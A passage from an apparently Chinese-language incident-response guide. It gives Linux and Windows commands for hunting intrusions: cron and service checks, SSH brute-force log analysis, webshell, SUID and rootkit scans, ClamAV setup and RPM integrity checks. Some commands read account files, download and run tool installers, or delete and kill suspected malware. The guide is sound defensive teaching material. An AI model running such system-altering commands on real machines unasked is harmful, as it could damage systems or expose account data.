期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。<br></code></pre></td></tr></table></figure><h4 id="5-3入侵排查"><a href="#5-3入侵排查" class="headerlink" title="5.3入侵排查"></a><strong>5.3入侵排查</strong></h4><p>重点关注以下目录中是否存在恶意脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">/var/spool/cron/* <br>/etc/crontab<br>/etc/cron.d/*<br>/etc/cron.daily/* <br>/etc/cron.hourly/* <br>/etc/cron.monthly/*<br>/etc/cron.weekly/<br>/etc/anacrontab<br>/var/spool/anacron/*<br></code></pre></td></tr></table></figure><p>小技巧：</p><p>more &#x2F;etc&#x2F;cron.daily&#x2F;*  查看目录下所有文件</p><h3 id="6-检查服务"><a href="#6-检查服务" class="headerlink" title="6. 检查服务"></a>6. <strong>检查服务</strong></h3><h4 id="6-1查询已安装的服务"><a href="#6-1查询已安装的服务" class="headerlink" title="6.1查询已安装的服务"></a><strong>6.1查询已安装的服务</strong></h4><p>RPM 包安装的服务</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>6.2 源码包安装的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务<br>ps aux | grep crond 查看当前服务<br><br>系统在3与5级别下的启动项 <br>中文环境<br>chkconfig --list | grep &quot;3:启用\|5:启用&quot;<br>英文环境<br>chkconfig --list | grep &quot;3:on\|5:on&quot;<br></code></pre></td></tr></table></figure><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">查看服务安装位置 ，一般是在/user/local/<br>service httpd start<br>搜索/etc/rc.d/init.d/  查看是否存在<br></code></pre></td></tr></table></figure><h3 id="7-host文件"><a href="#7-host文件" class="headerlink" title="7. host文件"></a>7. <strong>host文件</strong></h3><h4 id="7-1-查看host是否被修改"><a href="#7-1-查看host是否被修改" class="headerlink" title="7.1. 查看host是否被修改"></a>7.1. <strong>查看host是否被修改</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat /etc/hosts<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646703.png" alt="img"></p><h3 id="8-日志"><a href="#8-日志" class="headerlink" title="8. 日志"></a>8. <strong>日志</strong></h3><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p><p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">日志文件说明<br>/var/log/cron记录了系统定时任务相关的日志<br>/var/log/cups记录打印信息的日志<br>/var/log/dmesg记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息<br>/var/log/mailog记录邮件信息<br>/var/log/message记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件<br>/var/log/btmp记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看<br>/var/log/lastlog记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看<br>/var/log/wtmp永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看<br>/var/log/utmp记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询<br>/var/log/secure记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中<br></code></pre></td></tr></table></figure><h4 id="8-1-定位有多少IP在爆破主机的root帐号"><a href="#8-1-定位有多少IP在爆破主机的root帐号" class="headerlink" title="8.1. 定位有多少IP在爆破主机的root帐号"></a>8.1. <strong>定位有多少IP在爆破主机的root帐号</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more<br></code></pre></td></tr></table></figure><h4 id="8-2-定位有哪些IP在爆破"><a href="#8-2-定位有哪些IP在爆破" class="headerlink" title="8.2. 定位有哪些IP在爆破"></a>8.2. <strong>定位有哪些IP在爆破</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c<br></code></pre></td></tr></table></figure><h4 id="8-3-爆破用户名字典是什么"><a href="#8-3-爆破用户名字典是什么" class="headerlink" title="8.3. 爆破用户名字典是什么"></a>8.3. <strong>爆破用户名字典是什么</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr<br></code></pre></td></tr></table></figure><h4 id="8-4-登录成功的IP有哪些"><a href="#8-4-登录成功的IP有哪些" class="headerlink" title="8.4. 登录成功的IP有哪些"></a>8.4. <strong>登录成功的IP有哪些</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more<br></code></pre></td></tr></table></figure><h4 id="8-5-登录成功的日期、用户名、IP"><a href="#8-5-登录成功的日期、用户名、IP" class="headerlink" title="8.5. 登录成功的日期、用户名、IP"></a>8.5. <strong>登录成功的日期、用户名、IP</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;<br>#查询ssh登录记录<br>more /var/log/secure<br><br>#安装软件的日志-&gt; Centos<br>/var/log/yum.log<br><br>#安装软件的日志-&gt; Ubuntu<br>/var/log/apt/<br></code></pre></td></tr></table></figure><h4 id="8-6日志样例"><a href="#8-6日志样例" class="headerlink" title="8.6日志样例"></a><strong>8.6日志样例</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">1.增加一个用户kali日志：<br>Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001<br>Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali<br>, shell=/bin/bash<br>Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali<br>#grep &quot;useradd&quot; /var/log/secure <br><br>2.删除用户kali日志：<br>Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;<br>Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;<br>Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;<br># grep &quot;userdel&quot; /var/log/secure<br><br>3.su切换用户：<br>Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)<br><br>4.sudo授权执行:<br>sudo -l<br>Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now<br></code></pre></td></tr></table></figure><h4 id="8-7软件安装卸载日志"><a href="#8-7软件安装卸载日志" class="headerlink" title="8.7软件安装卸载日志"></a><strong>8.7软件安装卸载日志</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">yum install gcc<br><br>[root@bogon ~]# more /var/log/yum.log<br><br>Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64<br>Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64<br>Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64<br>Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64<br>Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686<br></code></pre></td></tr></table></figure><h3 id="9-命令修改状态"><a href="#9-命令修改状态" class="headerlink" title="9. 命令修改状态"></a>9. <strong>命令修改状态</strong></h3><h4 id="9-1-查看命名修改时间，防止被替换"><a href="#9-1-查看命名修改时间，防止被替换" class="headerlink" title="9.1. 查看命名修改时间，防止被替换"></a>9.1. <strong>查看命名修改时间，防止被替换</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">stat /bin/netstat<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646706.png" alt="img"></p><h2 id="三-文件"><a href="#三-文件" class="headerlink" title="三.文件"></a><strong>三.文件</strong></h2><h4 id="1-敏感目录查询"><a href="#1-敏感目录查询" class="headerlink" title="1.敏感目录查询"></a><strong>1.敏感目录查询</strong></h4><p>&#x2F;tmp, &#x2F;var&#x2F;tmp, &#x2F;dev&#x2F;shm，所有用户都可读，可写，可执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">[root@server120 ~]# ls -ald /tmp/<br>drwxrwxrwt. 10 root root 4096 9月 20 09:41 /tmp/<br>[root@server120 ~]# ls -ald /var/tmp/<br>drwxrwxrwt. 2 root root 4096 9月 18 16:57 /var/tmp/<br>[root@server120 ~]# ls -ald /dev/shm<br>drwxrwxrwt. 3 root root 60 9月 1 10:23 /dev/shm<br></code></pre></td></tr></table></figure><h4 id="2-时间点查询"><a href="#2-时间点查询" class="headerlink" title="2.时间点查询"></a><strong>2.时间点查询</strong></h4><p>通过列出攻击日期内变动的文件，发现相关的恶意文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">find / -ctime 0 -name &quot;*sh&quot;     //查询一天内新增sh的文件<br>stat xxx.sh     //查询文件的时间信息<br></code></pre></td></tr></table></figure><h4 id="3-隐藏文件查询"><a href="#3-隐藏文件查询" class="headerlink" title="3. 隐藏文件查询"></a>3. <strong>隐藏文件查询</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ls -ar |grep &quot;^\.&quot;      //列出当前目录下所有隐藏文件和隐藏文件夹。<br></code></pre></td></tr></table></figure><h4 id="4-特殊权限文件排查"><a href="#4-特殊权限文件排查" class="headerlink" title="4.特殊权限文件排查"></a><strong>4.特殊权限文件排查</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">find  /tmp -perm 777  <br>find  . *.txt -perm 777<br></code></pre></td></tr></table></figure><h4 id="5-Webshell查找"><a href="#5-Webshell查找" class="headerlink" title="5. Webshell查找"></a>5. <strong>Webshell查找</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">find /var/www/ -name &quot;*.php&quot;| xargs egrep<br></code></pre></td></tr></table></figure><h4 id="6-系统文件排查"><a href="#6-系统文件排查" class="headerlink" title="6. 系统文件排查"></a>6. <strong>系统文件排查</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">ls -alt /bin     查看命令目录下相关系统命令的修改时间<br>rpm -Va     查看发生过变化的软件包<br>ls -alh /bin    查看相关文件的大小，如果明显偏大，则文件可能被替换<br>Linux后门检测：（chkrootkit和rkhunter均需要下载安装）<br>chkrootkit 用来检测rootkit是否被安装到当前系统中<br>chkrootkit -q |grep INFECTED   --- 检测并筛选出存在infected内容<br><br>rkhunter进行命令Binary检测，包括MD5校验、rootkit检测、本机敏感目录检测、系统配置检测、服务及套件异常检测、第三方应用版本检测等。<br><br>rkhunter --check<br></code></pre></td></tr></table></figure><h4 id="7-排查SUID程序"><a href="#7-排查SUID程序" class="headerlink" title="7.排查SUID程序"></a><strong>7.排查SUID程序</strong></h4><p>对于一些设置了SUID权限的程序进行排查，可以使用find命令,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">find / -type f -perm -04000 -ls -uid 0 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h4 id="8-入侵排查"><a href="#8-入侵排查" class="headerlink" title="8. 入侵排查"></a>8. <strong>入侵排查</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性<br><br>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？<br><br> 可以使用find命令来查找，如 find /opt -iname &quot;*&quot; -atime 1 -type f 找出 /opt 下一天前访问过的文件<br><br>3、针对可疑文件可以使用 stat 进行创建修改时间。<br></code></pre></td></tr></table></figure><p>常用命令</p><p>find、grep 、egrep、awk、sed</p><h5 id="1-grep显示前后几行信息"><a href="#1-grep显示前后几行信息" class="headerlink" title="1.grep显示前后几行信息:"></a><strong>1.grep显示前后几行信息:</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">标准unix/linux下的grep通过下面參数控制上下文：<br> grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行<br> grep -B 5 foo file 显示foo及前5行<br> grep -A 5 foo file 显示foo及后5行<br> 查看grep版本号的方法是<br> grep -V<br></code></pre></td></tr></table></figure><h5 id="2-grep-查找含有某字符串的所有文件"><a href="#2-grep-查找含有某字符串的所有文件" class="headerlink" title="2.grep 查找含有某字符串的所有文件"></a><strong>2.grep 查找含有某字符串的所有文件</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep -rn &quot;hello,world!&quot; <br>* : 表示当前目录所有文件，也可以是某个文件名<br>-r 是递归查找<br>-n 是显示行号<br>-R 查找所有文件包含子目录<br>-i 忽略大小写<br></code></pre></td></tr></table></figure><h5 id="3-如何显示一个文件的某几行："><a href="#3-如何显示一个文件的某几行：" class="headerlink" title="3.如何显示一个文件的某几行："></a><strong>3.如何显示一个文件的某几行：</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat input_file | tail -n +1000 | head -n 2000<br>#从第1000行开始，显示2000行。即显示1000~2999行<br></code></pre></td></tr></table></figure><h5 id="4-find-etc-name-init"><a href="#4-find-etc-name-init" class="headerlink" title="4.find &#x2F;etc -name init"></a><strong>4.find &#x2F;etc -name init</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">//在目录/etc中查找文件init<br></code></pre></td></tr></table></figure><h5 id="5-只是显示-etc-passwd的账户"><a href="#5-只是显示-etc-passwd的账户" class="headerlink" title="5.只是显示&#x2F;etc&#x2F;passwd的账户"></a><strong>5.只是显示&#x2F;etc&#x2F;passwd的账户</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">`cat /etc/passwd |awk  -F &#x27;:&#x27;  &#x27;&#123;print $1&#125;&#x27;`  <br>//awk -F指定域分隔符为&#x27;:&#x27;，将记录按指定的域分隔符划分域，填充域， $0则表示所有域,$1表示第一个域, $n表示第n个域。<br></code></pre></td></tr></table></figure><h2 id="四-工具"><a href="#四-工具" class="headerlink" title="四.工具"></a><strong>四.工具</strong></h2><h3 id="1-Rootkit查杀"><a href="#1-Rootkit查杀" class="headerlink" title="1. Rootkit查杀"></a>1. <strong>Rootkit查杀</strong></h3><p>chkrootkit</p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">使用方法：<br>wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz<br>tar zxvf chkrootkit.tar.gz<br>cd chkrootkit-0.52<br>make sense<br>#编译完成没有报错的话执行检查<br>./chkrootkit<br></code></pre></td></tr></table></figure><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">The Rootkit Hunter project</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">使用方法：<br>Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz<br>tar -zxvf rkhunter-1.4.4.tar.gz<br>cd rkhunter-1.4.4<br>./installer.sh --install<br>rkhunter -c<br></code></pre></td></tr></table></figure><h3 id="2-病毒查杀"><a href="#2-病毒查杀" class="headerlink" title="2. 病毒查杀"></a>2. <strong>病毒查杀</strong></h3><p>Clamav</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">1、安装 zlib：<br>wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz <br>tar -zxvf  zlib-1.2.7.tar.gz<br>cd zlib-1.2.7<br>#安装一下gcc编译环境： yum install gcc<br>CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/<br>make &amp;&amp; make install<br><br>2、添加用户组 clamav 和组成员 clamav：<br>groupadd clamav<br>useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav<br><br>3、安装 Clamav<br>tar –zxvf clamav-0.97.6.tar.gz<br>cd clamav-0.97.6<br>./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib<br>make<br>make install<br><br>4、配置 Clamav<br>mkdir /opt/clamav/logs<br>mkdir /opt/clamav/updata<br>touch /opt/clamav/logs/freshclam.log<br>touch /opt/clamav/logs/clamd.log<br>cd /opt/clamav/logs<br>chown clamav:clamav clamd.log<br>chown clamav:clamav freshclam.log<br><br>5、ClamAV 使用：<br> /opt/clamav/bin/freshclam 升级病毒库<br>./clamscan –h 查看相应的帮助信息<br>./clamscan -r /home  扫描所有用户的主目录就使用<br>./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果<br></code></pre></td></tr></table></figure><p>安装方式二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">#安装<br>yum install -y clamav<br>#更新病毒库<br>freshclam<br>#扫描方法<br>clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log<br>clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log<br>clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log<br>#扫描并杀毒<br>clamscan -r  --remove  /usr/bin/bsd-port<br>clamscan -r  --remove  /usr/bin/<br>clamscan -r --remove  /usr/local/zabbix/sbin<br>#查看日志发现<br>cat /root/usrclamav.log |grep FOUND<br></code></pre></td></tr></table></figure><h3 id="3-Webshell查杀"><a href="#3-Webshell查杀" class="headerlink" title="3. Webshell查杀"></a>3. <strong>Webshell查杀</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">河马 WebShell 查杀：http://www.shellpub.com<br></code></pre></td></tr></table></figure><h3 id="4-RPM-check检测"><a href="#4-RPM-check检测" class="headerlink" title="4. RPM check检测"></a>4. <strong>RPM check检测</strong></h3><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./rpm -Va &gt; rpm.log<br></code></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">验证内容中的8个信息的具体内容如下：<br>S         文件大小是否改变<br>M         文件的类型或文件的权限（rwx）是否被改变<br>5         文件MD5校验是否改变（可以看成文件内容是否改变）<br>D         设备中，从代码是否改变<br>L         文件路径是否改变<br>U         文件的属主（所有者）是否改变<br>G         文件的属组是否改变<br>T         文件的修改时间是否改变<br></code></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">文件提取还原案例：<br>rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包<br>mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象<br>rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下<br>cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失<br></code></pre></td></tr></table></figure><h3 id="5-Linux安全检查脚本"><a href="#5-Linux安全检查脚本" class="headerlink" title="5.Linux安全检查脚本"></a><strong>5.Linux安全检查脚本</strong></h3><p>Github 项目地址：</p><p><a href="https://github.com/grayddq/GScan">GitHub - grayddq&#x2F;GScan: 本程序旨在为安全应急响应人员对Linux主机排查时提供便利，实现主机侧Checklist的自动全面化检测，根据检测结果自动数据聚合，进行黑客攻击路径溯源。</a></p><p><a href="https://github.com/ppabc/security_check">GitHub - ppabc&#x2F;security_check: LINUX安全检查脚本，支持centos5,centos6,ubuntu</a></p><p><a href="https://github.com/T0xst/linux">GitHub - T0xst&#x2F;linux: linux安全检查</a></p><h1 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a><strong>Windows应急响应</strong></h1><h2 id="一-检查系统账号"><a href="#一-检查系统账号" class="headerlink" title="一.检查系统账号"></a><strong>一.检查系统账号</strong></h2><h4 id="1-检查有没有新增用户"><a href="#1-检查有没有新增用户" class="headerlink" title="1.检查有没有新增用户"></a><strong>1.检查有没有新增用户</strong></h4><p>打开计算机管理看有没有可疑用户，命令行net user看有没有可疑用户，有的话就删除。</p><p>$test可隐藏，需要在查看注册表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">net user    （无法列出$用户）<br>lusrmgr    （无法找到注册表方式建立的用户）<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList，HKLM\SAM\Domains\Account\    查注册表最准<br>#查询当前登录系统的会话<br>query user<br><br>#把用户踢出会话<br>logoff ID<br></code></pre></td></tr></table></figure><h2 id="二-检查进程网络端口"><a href="#二-检查进程网络端口" class="headerlink" title="二.检查进程网络端口"></a><strong>二.检查进程网络端口</strong></h2><p>检察系统进程，还有自己没有打开的端口，有没有可疑文件，右键属性打开将可疑文件丢到在线病毒检测看报不报毒，报毒了就上报删除。</p><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a><strong>1.常用命令</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">1.查看开放的端口：netstat -ano<br>2.重点看状态是 ESTABLISHED 的端口：netstat -ano | findstr &#x27;estab&#x27;<br>3.查看路由：netstat -rn<br>4.查看系统信息：msinfo32，依次点击 软件环境→正在运行任务，可以看到当前的进程<br>5.杀死进程：<br>  taskkill /f /pid 123 /t<br>  taskkill /f /im explorer.exe /t<br>6.显示 进程--PID--服务： tasklist /svc<br>7.防火墙配置：netsh firewall show all<br>8.查找固定端口号 netstat -abno | find &quot;port number&quot; <br>9.查找固定进程PID  tasklist | findstr PID<br></code></pre></td></tr></table></figure><h3 id="2-检查网络连接"><a href="#2-检查网络连接" class="headerlink" title="2. 检查网络连接"></a>2. <strong>检查网络连接</strong></h3><p>检查网络监听和连接的端口和应用程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">netstat -anob<br></code></pre></td></tr></table></figure><p>输出主机上的所有侦听和活动连接，包括 PID 和连接到每个连接的程序的名称。 这也告诉 Netstat返回连接的 IP 地址，而不是试图确定它们的主机名。</p><p>● -a 